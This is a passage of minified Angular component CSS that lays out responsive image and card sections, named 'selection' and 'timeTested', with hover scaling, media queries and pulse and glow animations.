img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:-60px;left:340px;z-index:1}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:100px;left:550px;z-index:1}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}}@media (max-width: 861px){.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]{background-size:400px 400px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]{justify-content:center!important;gap:20px;padding:10px;flex-wrap:wrap}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]{min-height:500px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:-50px;left:0;z-index:1}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:-60px;left:240px;z-index:1}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:100px;left:350px;z-index:1}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}}@media (max-width: 480px){.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]{background-size:300px 300px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]{padding:10px;flex-direction:column;align-items:center;gap:20px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]{min-height:400px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){top:80px;left:0}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){top:70px;left:100px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){top:200px;left:150px}}@media (max-width: 375px){.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]{background-size:300px 300px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]{padding:10px;flex-direction:column;align-items:center;gap:20px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]{min-height:400px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){top:80px;left:-100px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){top:70px;left:20px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){top:130px;left:80px}}@keyframes _ngcontent-%COMP%_pulse{0%{background-size:600px 600px}50%{background-size:800px 800px}to{background-size:600px 600px}}.wrapper--selection--third--section[_ngcontent-%COMP%]{position:relative}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--circle--background[_ngcontent-%COMP%]{width:100%;height:100%;position:absolute;top:0;left:0;animation:_ngcontent-%COMP%_blink-Circle 4s infinite linear;background:url(/assets/images/backselection.png) no-repeat 75% -20%,url(/assets/images/backgray.png) no-repeat 35% 0%}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]{display:flex;flex-direction:column;justify-content:flex-end;min-height:762px;margin-bottom:200px}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--card--main[_ngcontent-%COMP%]{display:flex;justify-content:space-evenly;z-index:1000;padding-top:80px}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--card--main[_ngcontent-%COMP%]   .selection--third--info--card[_ngcontent-%COMP%]{display:flex;flex-direction:column;justify-content:space-around;width:240px;height:189px;padding:0 20px;border-radius:12px;-webkit-backdrop-filter:blur(22px);backdrop-filter:blur(22px);background:#00000026}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--card--main[_ngcontent-%COMP%]   .selection--third--info--card[_ngcontent-%COMP%]   .selection--third--info--card--img[_ngcontent-%COMP%]{display:flex;align-items:center}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--card--main[_ngcontent-%COMP%]   .selection--third--info--card[_ngcontent-%COMP%]   .selection--third--info--card--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{transition:transform .3s ease;height:auto;display:block}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--card--main[_ngcontent-%COMP%]   .selection--third--info--card[_ngcontent-%COMP%]   .selection--third--info--card--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:22px;margin-right:180px}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--card--main[_ngcontent-%COMP%]   .selection--third--info--card[_ngcontent-%COMP%]   .selection--third--info--card--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:22px;margin-right:15px}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--card--main[_ngcontent-%COMP%]   .selection--third--info--card[_ngcontent-%COMP%]   .selection--third--info--card--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:22px}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--card--main[_ngcontent-%COMP%]   .selection--third--info--card[_ngcontent-%COMP%]   .selection--third--info--card--text[_ngcontent-%COMP%]   .selection--third--info--card--text--title[_ngcontent-%COMP%]{margin-bottom:8px;color:#fff;font-family:Poppins;font-size:26px;font-weight:600;line-height:120%;letter-spacing:0%;text-align:left}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--card--main[_ngcontent-%COMP%]   .selection--third--info--card[_ngcontent-%COMP%]   .selection--third--info--card--text[_ngcontent-%COMP%]   .selection--third--info--card--text--subtitle[_ngcontent-%COMP%]{color:#fff;font-family:Raleway;font-size:14px;font-weight:500;line-height:120%;letter-spacing:0%;text-align:left}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--img[_ngcontent-%COMP%]{position:relative;min-height:553px}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{transition:transform .3s ease;position:absolute;width:260px}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:144px;left:80px;z-index:1}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:20px;left:350px;z-index:1}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:0;left:620px;z-index:1}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){position:absolute;top:144px;left:890px;z-index:1}.wrapper--selection--third--section[_ngcontent-%COMP%]   .wrapper--selection--third[_ngcontent-%COMP%]   .selection--third--info[_ngcontent-%COMP%]   .selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4):hover{transform:scale(1.1)}@media (max-width: 1025px){.selection--third--info--img[_ngcontent-%COMP%]{position:relative;min-height:553px}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{transition:transform .3s ease;position:absolute;width:260px}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:144px;left:0!important;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:60px!important;left:260px!important;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:40px!important;left:520px!important;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){position:absolute;top:144px;left:780px!important;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4):hover{transform:scale(1.1)}}@media (max-width: 768px){.selection--third--info--card--main[_ngcontent-%COMP%]{flex-wrap:wrap;justify-content:center!important;gap:20px}}@media (max-width: 425px){.selection--third--info--img[_ngcontent-%COMP%]{position:relative;min-height:553px}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{transition:transform .3s ease;position:absolute;width:260px}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){display:none;position:absolute;top:144px;left:0!important;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:204.25px!important;height:380px!important;position:absolute;top:60px!important;left:10px!important;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:204.25px!important;height:380px!important;position:absolute;top:40px!important;left:210px!important;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){display:none;position:absolute;top:144px;left:890px;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4):hover{transform:scale(1.1)}}@media (max-width: 375px){.selection--third--info--img[_ngcontent-%COMP%]{position:relative;min-height:553px}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{transition:transform .3s ease;position:absolute;width:260px}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){display:none;position:absolute;top:144px;left:0!important;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:204.25px!important;height:380px!important;position:absolute;top:60px!important;left:-30px!important;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:204.25px!important;height:380px!important;position:absolute;top:40px!important;left:175px!important;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){display:none;position:absolute;top:144px;left:890px;z-index:1}.selection--third--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4):hover{transform:scale(1.1)}}@keyframes _ngcontent-%COMP%_pulse--bg{0%{background-size:753px 753px}50%{background-size:850px 850px}to{background-size:753px 753px}}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--circle--background[_ngcontent-%COMP%]{width:100%;height:800px;position:absolute;top:0;left:0;animation:_ngcontent-%COMP%_blink-Circle 4s infinite linear;background:url(/assets/images/testedback.png) no-repeat 130% 50%}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]{position:relative;min-height:647px}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:0;left:0;color:#ff8a00;font-family:Raleway;font-size:11px;font-weight:700;line-height:120%;letter-spacing:0%;text-align:left;text-transform:uppercase}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:65px;left:0;max-width:307px;min-height:84px;color:#fff;font-family:Raleway;font-size:42px;font-weight:700;line-height:100%;letter-spacing:0%;text-align:left;text-transform:uppercase}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:350px;left:910px;max-width:270px;min-height:126px;color:#fff;font-family:Raleway;font-size:42px;font-weight:700;line-height:100%;letter-spacing:0%;text-align:left;text-transform:uppercase}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(4){position:absolute;top:521px;left:221px;max-width:379px;min-height:126px;color:#fff;font-family:Raleway;font-size:42px;font-weight:700;line-height:100%;letter-spacing:0%;text-align:left;text-transform:uppercase}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{transition:transform .3s ease;position:absolute;width:auto;height:auto}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:250px;position:absolute;top:37px;left:795px}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:290px;position:absolute;top:166px;left:300px}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:230px;position:absolute;top:401px;left:634px}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){position:absolute;top:271px;left:701px}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4):hover{transform:scale(1.1)}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(5){position:absolute;top:171px;left:658px}.wrapper--timeTested--section[_ngcontent-%COMP%]   .wrapper--timeTested[_ngcontent-%COMP%]   .timeTested--info[_ngcontent-%COMP%]   .timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(5):hover{transform:scale(1.1)}@keyframes _ngcontent-%COMP%_diamondGlow{0%,to{text-shadow:0 0 1px rgba(255,255,255,.8),0 0 2px rgba(255,255,255,.8),0 0 5px rgba(255,255,255,.8),0 0 7px rgba(255,255,255,.8),0 0 9px rgba(255,255,255,.8);color:#fff}50%{text-shadow:0 0 1px rgba(255,138,0,.8),0 0 2px rgba(255,138,0,.8),0 0 5px rgba(255,138,0,.8),0 0 7px rgba(255,138,0,.8),0 0 9px rgba(255,138,0,.8)}}@media (max-width: 1180px){.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(1){font-size:24px!important;top:0!important;left:23px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(2){font-size:24px!important;top:65px!important;left:23px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(3){font-size:24px!important;top:350px!important;left:710px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(4){font-size:24px!important;top:521px!important;left:121px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:250px;position:absolute;top:37px!important;left:595px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:290px;position:absolute;top:166px!important;left:100px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:230px;position:absolute;top:401px!important;left:434px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){position:absolute;top:271px!important;left:501px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4):hover{transform:scale(1.1)}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(5){position:absolute;top:171px!important;left:458px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(5):hover{transform:scale(1.1)}}@media (max-width: 871px){.timeTested--info[_ngcontent-%COMP%]{min-height:1004px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(1){font-size:24px!important;top:0!important;left:23px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(2){font-size:24px!important;top:65px!important;left:23px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(3){font-size:24px!important;top:387px!important;left:498px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(4){font-size:24px!important;top:716px!important;left:253px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:184px!important;height:184px!important;top:166px!important;left:430px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:184px!important;height:184px!important;top:490px!important;left:120px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:184px!important;height:184px!important;top:819px!important;left:330px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){width:32.81px!important;height:32px!important;top:100px!important;left:310px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(5){width:32.81px!important;height:32px!important;top:646px!important;left:410px!important}}@media (max-width: 661px){.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(3){font-size:24px!important;top:387px!important;left:298px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(4){font-size:24px!important;top:716px!important;left:253px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:184px!important;height:184px!important;top:166px!important;left:230px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:184px!important;height:184px!important;top:490px!important;left:120px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:184px!important;height:184px!important;top:819px!important;left:330px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){width:32.81px!important;height:32px!important;top:100px!important;left:310px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(5){width:32.81px!important;height:32px!important;top:646px!important;left:410px!important}}@media (max-width: 515px){.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(3){font-size:24px!important;top:387px!important;left:198px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(4){font-size:24px!important;top:716px!important;left:253px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:184px!important;height:184px!important;top:166px!important;left:230px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:184px!important;height:184px!important;top:490px!important;left:120px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:184px!important;height:184px!important;top:819px!important;left:230px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){width:32.81px!important;height:32px!important;top:100px!important;left:210px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(5){width:32.81px!important;height:32px!important;top:646px!important;left:310px!important}}@media (max-width: 426px){.timeTested--info[_ngcontent-%COMP%]{min-height:1004px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(1){font-size:24px!important;top:0!important;left:23px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(2){font-size:24px!important;top:65px!important;left:23px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(3){font-size:24px!important;top:387px!important;left:98px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(4){font-size:24px!important;top:716px!important;left:110px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:184px!important;height:184px!important;top:166px!important;left:230px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:184px!important;height:184px!important;top:490px!important;left:10px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:184px!important;height:184px!important;top:819px!important;left:200px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){width:32.81px!important;height:32px!important;top:100px!important;left:210px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(5){width:32.81px!important;height:32px!important;top:646px!important;left:210px!important}}@media (max-width: 376px){.timeTested--info[_ngcontent-%COMP%]{min-height:1004px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(1){font-size:24px!important;top:0!important;left:23px!important}.timeTested--info--text[_ngcontent-%COMP%]   